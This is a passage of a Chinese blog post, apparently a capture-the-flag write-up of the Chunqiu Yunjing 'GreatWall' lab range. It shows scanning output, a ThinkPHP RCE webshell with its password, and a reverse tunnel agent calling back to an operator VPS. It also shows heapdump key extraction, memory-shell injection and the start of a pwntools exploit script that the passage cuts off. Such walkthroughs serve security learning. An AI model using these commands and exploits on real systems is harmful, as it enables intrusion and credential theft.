<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/784db4820097b506.css" as="style"/><link rel="stylesheet" href="/_next/static/css/784db4820097b506.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-11d6836cabe9ca8b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-2fd59312591c37bd.js" defer=""></script><script src="/_next/static/PJghSypTuWEFTtl66wJg-/_buildManifest.js" defer=""></script><script src="/_next/static/PJghSypTuWEFTtl66wJg-/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"春秋云镜GreatWall","contentHtml":"\u003ch1\u003eGreatWall\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://yunjing.ichunqiu.com/major/detail/1171?type=2\"\u003ehttps://yunjing.ichunqiu.com/major/detail/1171?type=2\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image34.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e8.130.146.145\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/greatwall  nmap -sT -min-rate 10000 -p- 8.130.146.145\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 08:56 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 8.130.146.145\nHost is up (0.012s latency).\nNot shown: 65530 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n25/tcp   open  smtp\n53/tcp   open  domain\n80/tcp   open  http\n110/tcp  open  pop3\n8080/tcp open  http-proxy\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 19.87 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e服务，并提取指纹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image35.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问\u003ccode\u003e8080\u003c/code\u003e端口，是管理页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image36.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eWEB渗透 - 1\u003c/h2\u003e\n\u003cp\u003e手动测试了以下弱密码等方法，但是根本没有将数据传过去，使用\u003ccode\u003efscan\u003c/code\u003e扫描一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools  ./fscan_1.8.4 -h 8.130.146.145                                                                                                                                                                   \n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n8.130.146.145:8080 open\n8.130.146.145:80 open\n[*] alive ports len is: 2\nstart vulscan\n[*] WebTitle http://8.130.146.145      code:200 len:10887  title:\"\"\n[*] WebTitle http://8.130.146.145:8080 code:200 len:1027   title:Login Form\n[+] PocScan http://8.130.146.145:8080 poc-yaml-thinkphp5023-method-rce poc1\n已完成 2/2\n[*] 扫描结束,耗时: 23.801911592s\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描出存在\u003ccode\u003eThinkPHP5\u003c/code\u003e的RCE漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image37.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一键梭哈，点击\u003ccode\u003eGETSHELL\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[+] http://8.130.146.145:8080/peiqi.php   Pass:peiqi\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eAntSword\u003c/code\u003e连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image38.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在根目录下能找到\u003ccode\u003eFlag1\u003c/code\u003e （一开始以为要提权）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/) $ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e f1ag01_UdEv.txt\nflag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e内网信息收集 - 1\u003c/h2\u003e\n\u003cp\u003e得知内网网段\u003ccode\u003e172.28.23.x\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/) $ ip add\n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 00:16:3e:0c:c8:c0 brd ff:ff:ff:ff:ff:ff\n    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0\n       valid_lft 315358799sec preferred_lft 315358799sec\n    inet6 fe80::216:3eff:fe0c:c8c0/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e反弹\u003ccode\u003eShell\u003c/code\u003e到\u003ccode\u003eVPS\u003c/code\u003e上，上传\u003ccode\u003efscan\u003c/code\u003e进行扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@portal:/var/www/html/background/public$ ./fscan -h 172.28.23.1/24\n./fscan -h 172.28.23.1/24                \n┌──────────────────────────────────────────────┐                   \n│    ___                              _        │                                                                                                                                                              \n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │                                                                                                                                                              \n│  / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;     │                                                 \n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │                                                                                                                                                              \n└──────────────────────────────────────────────┘                                                                                                                                                              \n      Fscan Version: 2.0.0                                    \n                                            \n[2025-03-29 21:20:50] [INFO] 暴力破解线程数: 1\n[2025-03-29 21:20:50] [INFO] 开始信息扫描\n[2025-03-29 21:20:50] [INFO] CIDR范围: 172.28.23.0-172.28.23.255              \n[2025-03-29 21:20:50] [INFO] 生成IP范围: 172.28.23.0.%!d(string=172.28.23.255) - %!s(MISSING).%!d(MISSING)\n[2025-03-29 21:20:50] [INFO] 解析CIDR 172.28.23.1/24 -\u003e IP范围 172.28.23.0-172.28.23.255\n[2025-03-29 21:20:50] [INFO] 最终有效主机数量: 256\n[2025-03-29 21:20:50] [INFO] 开始主机扫描\n[2025-03-29 21:20:50] [INFO] 正在尝试无监听ICMP探测...\n[2025-03-29 21:20:50] [INFO] 当前用户权限不足,无法发送ICMP包\n[2025-03-29 21:20:50] [INFO] 切换为PING方式探测...            \n[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)\n[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.33    存活 (ICMP)\n[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.17    存活 (ICMP)\n[2025-03-29 21:20:57] [INFO] 存活主机数量: 3                  \n[2025-03-29 21:20:57] [INFO] 有效端口数量: 233\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.33:22                     \n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:22\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:21\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:80\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:22\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:80\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.33:8080\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:8080\n[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.33:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]    \n[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.26:22 =\u003e [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]    \n[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.26:21 =\u003e [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]                                                                               \n[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.17:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.]      \n[2025-03-29 21:21:02] [SUCCESS] 服务识别 172.28.23.33:8080 =\u003e [http]\n[2025-03-29 21:21:02] [SUCCESS] 服务识别 172.28.23.17:8080 =\u003e [http]\n[2025-03-29 21:21:03] [SUCCESS] 服务识别 172.28.23.17:80 =\u003e [http]\n[2025-03-29 21:21:03] [SUCCESS] 服务识别 172.28.23.26:80 =\u003e [http]\n[2025-03-29 21:21:03] [INFO] 存活端口数量: 8                              \n[2025-03-29 21:21:03] [INFO] 开始漏洞扫描\n[2025-03-29 21:21:03] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle\n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=FB1FB63C9EC9F3C16B00B0127DA0965D                  \n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.26       状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413                                            \n[2025-03-29 21:21:03] [SUCCESS] 匿名登录成功!   \n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.17       状态码:200 长度:10887  标题:\"\"\n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.17:8080  状态码:200 长度:1027   标题:Login Form                                                                                                     \n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=FB1FB63C9EC9F3C16B00B0127DA0965D 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆                                         \n[2025-03-29 21:21:04] [SUCCESS] 目标: http://172.28.23.17:8080\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1                              \n  详细信息:                              \n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n[2025-03-29 21:21:05] [SUCCESS] 目标: http://172.28.23.33:8080                                            \n  漏洞类型: poc-yaml-spring-actuator-heapdump-file                                      \n  漏洞名称:                                       \n  详细信息:                              \n        author:AgeloVito                              \n        links:https://www.cnblogs.com/wyb628/p/8567610.html \n[2025-03-29 21:21:05] [SUCCESS] 目标: http://172.28.23.33:8080\n  漏洞类型: poc-yaml-springboot-env-unauth                      \n  漏洞名称: spring2                                             \n  详细信息:                                                     \n        links:https://github.com/LandGrey/SpringBootVulExploit\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e三台存活主机：172.28.23.26，172.28.23.33，172.28.23.17\u003c/p\u003e\n\u003cp\u003e并且\u003ccode\u003e172.28.23.33\u003c/code\u003e存在公开漏洞，可进行利用\u003c/p\u003e\n\u003ch2\u003e一层代理搭建\u003c/h2\u003e\n\u003cp\u003e使用\u003ccode\u003estowaway\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e./linux_x64_admin -l 2087 -s 12\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@portal:/var/www/html/background/public$ ./linux_x64_agent -c \u0026#x3C;VPS-ip\u003e:2087 -s 123 --reconnect 8                                                                                                 \n\u0026#x3C;64_agent -c \u0026#x3C;VPS-ip\u003e:2087 -s 123 --reconnect 8\n2025/03/29 21:32:51 [*] Starting agent node actively.Connecting to \u0026#x3C;VPS-ip\u003e:2087.Reconnecting every 8 seconds                                                                                            \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在服务端设置\u003ccode\u003esocks\u003c/code\u003e代理\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(admin) \u003e\u003e detail\nNode[0] -\u003e IP: 8.130.146.145:46344  Hostname: portal  User: www-data\nMemo: \n\n(admin) \u003e\u003e use 0\n(node 0) \u003e\u003e socks 8080 admin admin\n[*] Trying to listen on 0.0.0.0:8080......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Socks start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行测试，配置好\u003ccode\u003eproxychains\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools  proxychains4 curl http://172.28.23.33:8080/login                 \n[proxychains] config file found: /etc/proxychains4.conf                                                           \n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            \n[proxychains] DLL init: proxychains-ng 4.17                                                                       \n[proxychains] Strict chain  ...  \u0026#x3C;VPS-ip\u003e:1080  ...  172.28.23.33:8080  ...  OK\n\u0026#x3C;!DOCTYPE html PUBLIC \u003cspan class=\"hljs-string\"\u003e\"-//W3C//DTD XHTML 1.0 Transitional//EN\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"\u003c/span\u003e\u003e\n\u0026#x3C;html xmlns=\u003cspan class=\"hljs-string\"\u003e\"http://www.w3.org/1999/xhtml\"\u003c/span\u003e\u003e\n\u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e\u003e                  \n  \u0026#x3C;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"Content-Type\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"text/html; charset=utf-8\"\u003c/span\u003e /\u003e\n  \u0026#x3C;title\u003e智联科技 ERP 后台登陆\u0026#x3C;/title\u003e           \n  \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/css\"\u003c/span\u003e rel=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"/css/common.css\"\u003c/span\u003e /\u003e\n  \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/css\"\u003c/span\u003e rel=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"/css/style.css\"\u003c/span\u003e /\u003e\n  \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/css\"\u003c/span\u003e rel=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"/css/login.css\"\u003c/span\u003e /\u003e\n  .....\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e搭建成功\u003c/p\u003e\n\u003ch2\u003e172.28.23.33 - ERP\u003c/h2\u003e\n\u003ch3\u003espring-actuator-heapdump\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e172.28.23.33:8080\u003c/code\u003e 有公开漏洞 \u003ccode\u003epoc-yaml-spring-actuator-heapdump-file\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image39.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将\u003ccode\u003eheapdump\u003c/code\u003e 文件下载下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools  proxychains4 wget http://172.28.23.33:8080/actuator/heapdump\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n--2025-03-29 09:50:18--  http://172.28.23.33:8080/actuator/heapdump\n正在连接 172.28.23.33:8080... [proxychains] Strict chain  ...  \u0026#x3C;VPS-ip\u003e:1080  ...  172.28.23.33:8080  ...  OK\n已连接。\n已发出 HTTP 请求，正在等待回应... 200 \n长度：28261428 (27M) [application/octet-stream]\n正在保存至: “heapdump”\n\nheapdump                                                 100%[==================================================================================================================================\u003e]  26.95M  6.20MB/s  用时 4.0s    \n\n2025-03-29 09:50:23 (6.77 MB/s) - 已保存 “heapdump” [28261428/28261428])\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eJDumpSpider\u003c/code\u003e来读取敏感信息\u003c/p\u003e\n\u003cp\u003e工具链接：\u003ca href=\"https://github.com/whwlsfb/JDumpSpider\"\u003ehttps://github.com/whwlsfb/JDumpSpider\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e可以读到\u003ccode\u003eShiro\u003c/code\u003e的信息，并将其密钥读出来了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/greatwall  java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                     \n===========================================                                                                                                                                                                                         \nCookieRememberMeManager(ShiroKey)                                                                                                                                                                                                   \n-------------                                                                                                                                                                                                                       \nalgMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES                                                                                                                                                                        \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e工具梭哈\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image40.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注入内存马\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image41.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用冰蝎进行连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image42.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e59696 端口\u003c/h3\u003e\n\u003cp\u003e在根目录下没找到\u003ccode\u003eflag\u003c/code\u003e文件，应该是要提权了\u003c/p\u003e\n\u003cp\u003e开启了一个很奇怪的端口\u003ccode\u003e59696\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/ \u003ess -tulpn\n\nNetid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process \nudp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            \nudp   UNCONN 0      0       172.28.23.33%eth0:68           0.0.0.0:*            \nudp   UNCONN 0      0               127.0.0.1:323          0.0.0.0:*            \nudp   UNCONN 0      0                   [::1]:323             [::]:*            \ntcp   LISTEN 0      64                0.0.0.0:59696        0.0.0.0:*            \ntcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            \ntcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            \ntcp   LISTEN 0      100                     *:8080               *:*     \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e:((\"java\",pid=\u003cspan class=\"hljs-number\"\u003e667\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e))\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e需要进行验证\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q nc 172.28.23.33 59696\nConnection established!\nServer \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: Sat Mar 29 22:10:58 2025\n\nUsername: 1\nPassword: 2\n\nUnauthorized\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在用户家目录发现\u003ccode\u003eHashNote\u003c/code\u003e，就是\u003ccode\u003e59696\u003c/code\u003e端口运行的程序\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image43.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e下载，使用\u003ccode\u003eIDA\u003c/code\u003e分析，不会逆向\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image44.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看WP，得知是PWN（这些我是真的菜）\u003c/p\u003e\n\u003cp\u003eexp 如下（\u003ca href=\"https://www.dr0n.top/posts/f249db01/#%E6%99%BA%E8%81%94%E7%A7%91%E6%8A%80-ERP-172-28-23-33\"\u003ehttps://www.dr0n.top/posts/f249db01/#智联科技-ERP-172-28-23-33\u003c/a\u003e）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\ncontext.arch=\u003cspan class=\"hljs-string\"\u003e'amd64'\u003c/span\u003e\n\ndef add(key,data=\u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e):\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Option:'\u003c/span\u003e,b\u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e)\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Key:'\u003c/span\u003e,key)\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Data:'\u003c/span\u003e,data)\n\ndef show(key):\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Option:'\u003c/span\u003e,b\u003cspan class=\"hljs-string\"\u003e'2'\u003c/span\u003e)\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e\"Key: \"\u003c/span\u003e,key);\n\ndef edit(key,data):\n    p.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Option:'\u003c/span\u003e,b\u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e)\n    